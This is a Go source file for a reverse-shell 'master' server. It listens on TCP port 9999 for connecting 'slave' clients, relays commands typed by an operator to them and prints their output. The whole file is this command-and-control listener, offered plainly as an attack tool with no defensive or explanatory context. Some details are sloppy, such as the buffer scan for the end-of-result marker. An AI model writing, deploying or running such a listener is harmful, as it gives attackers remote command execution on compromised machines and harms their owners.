package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
)

func handleConn(conn net.Conn) {
	raddr := conn.RemoteAddr()
	fmt.Printf("new slave is connected raddr is %v\n: ", raddr.String())
	fmt.Println("waiting for master commands...")
	scanner := bufio.NewScanner(os.Stdin)

	//Reading master commands...
	for scanner.Scan() {
		cmd := scanner.Text() // + "\n"
		//fmt.Println("master command is: ", cmd)
		rr := strings.NewReader(cmd + "\n")
		//Sending cmds to slave...
		_, err := io.Copy(conn, rr)
		if err != nil {
			fmt.Printf("cant write to slave conn : %v", err)
			return
		}
		//Waiting for slave reply...
		//Flag to read || write ...
		canRead := true
		fmt.Println("Command result: ")
		for canRead {
			//Reading result frm slave...
			bs := make([]byte, 64)
			n, err := conn.Read(bs)
			if err != nil {
				fmt.Printf("cant read result from slave: %v", err)
				return
			}
			fmt.Print(string(bs[:n]))
			//Check if it is the end of the response...
			for _, b := range bs {
				if b == byte('\r') {
					fmt.Println("\nprint next command")
					//Detected the end of result...
					canRead = false
					break
				}
			}

		}
	}
}

func main() {
	fmt.Println("reverse sh master server")
	ln, err := net.Listen("tcp", ":9999")
	if err != nil {
		fmt.Println("cant start listener", err)
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("can't establish connection with slave client", err)
		}
		defer conn.Close()
		handleConn(conn)
	}
}
